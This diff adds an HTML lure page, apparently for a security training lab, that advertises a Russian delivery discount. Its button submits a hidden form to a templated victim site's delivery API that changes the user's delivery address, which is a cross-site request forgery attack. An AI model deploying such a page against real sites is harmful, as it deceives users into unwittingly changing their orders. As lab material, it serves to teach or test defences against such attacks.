@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Доставка со скидкой</title>
+  <style>
+    * { box-sizing: border-box; letter-spacing: 0; }
+    body { margin: 0; font: 18px/1.6 Arial, sans-serif; color: #232b37; border-top: 5px solid #0097a7; }
+    header { padding: 20px 32px; border-bottom: 1px solid #e8edf5; font-weight: 700; color: #00808f; }
+    main { max-width: 720px; margin: 32px auto; padding: 24px; }
+    img { display: block; width: 100%; height: 260px; object-fit: contain; }
+    h1 { font-size: 32px; line-height: 1.2; color: #05358c; }
+    button { border: 0; border-radius: 4px; padding: 14px 24px; font: inherit; color: #fff; background: #05358c; cursor: pointer; }
+    button:hover { background: #0748bb; }
+    button:focus-visible { outline: 3px solid #0097a7; outline-offset: 4px; }
+    small { display: block; color: #647084; margin-top: 24px; }
+    @media(max-width:600px) { main { margin: 0 auto; } h1 { font-size: 28px; } img { height: 200px; } }
+  </style>
+</head>
+<body>
+  <header>Бонусы на доставку</header>
+  <main>
+    <img src="/catalog.png" alt="Каталог электротехнической продукции" width="420" height="300">
+    <h1>Доставка со скидкой 20%</h1>
+    <p>Персональное предложение к следующему заказу.</p>
+    <form action="{{VICTIM_ORIGIN}}/api/site/delivery" method="post">
+      <input type="hidden" name="address" value="Москва, ул. Подставная, 99">
+      <button type="submit">Получить скидку</button>
+    </form>
+    <small>Учебная акция. Реальные заказы и платежи не выполняются.</small>
+  </main>
+</body>
+</html>
